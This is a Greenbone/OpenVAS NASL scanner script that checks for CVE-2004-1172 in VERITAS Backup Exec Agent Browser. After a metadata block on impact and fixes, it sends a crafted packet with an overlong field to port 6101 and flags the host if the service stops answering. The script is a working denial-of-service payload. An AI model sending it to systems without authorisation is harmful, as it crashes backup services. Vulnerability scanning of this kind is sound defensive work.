# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802981");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2004-1172");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-10-11 13:42:29 +0530 (Thu, 11 Oct 2012)");
  script_name("VERITAS Backup Exec Agent Browser Remote Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(6101);

  script_xref(name:"URL", value:"http://secunia.com/advisories/13495");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11974");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/907729");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/750/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/18506");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-01/0318.html");
  script_xref(name:"URL", value:"http://www.hitachi.co.jp/Prod/comp/soft1/global/security/pdf/HS05-002.pdf");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to overflow a buffer and
  execute arbitrary code on the system.");

  script_tag(name:"affected", value:"Veritas Backup Exec Agent Browser version 8.x before 8.60.3878 Hotfix 68,
  and 9.x before 9.1.4691 Hotfix 40");

  script_tag(name:"insight", value:"The name server registration service (benetns.exe) fails to validate the
  client hostname field during the registration process, which leads into
  stack-based buffer overflow.");

  script_tag(name:"solution", value:"Upgrade to Veritas Backup Exec Agent Browser 8.60.3878 Hotfix 68 or
  9.1.4691 Hotfix 40 or later.");

  script_tag(name:"summary", value:"VERITAS Backup Exec Agent Browser is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.symantec.com/index.jsp");
  exit(0);
}

port = 6101;
if(!get_port_state(port)){
  exit (0);
}

hostname = get_host_name();
soc = open_sock_tcp (port);
if(!soc){
  exit (0);
}

req = raw_string (0x02, 0x00, 0x00, 0x00) + crap (data:'A', length:100) +
      raw_string (0x00) + hostname + raw_string (0x00);
send (socket:soc, data:req);

close (soc);

sleep(5);

soc = open_sock_tcp (port);
if(!soc)
{
  security_message(port);
  exit(0);
}

close(soc);
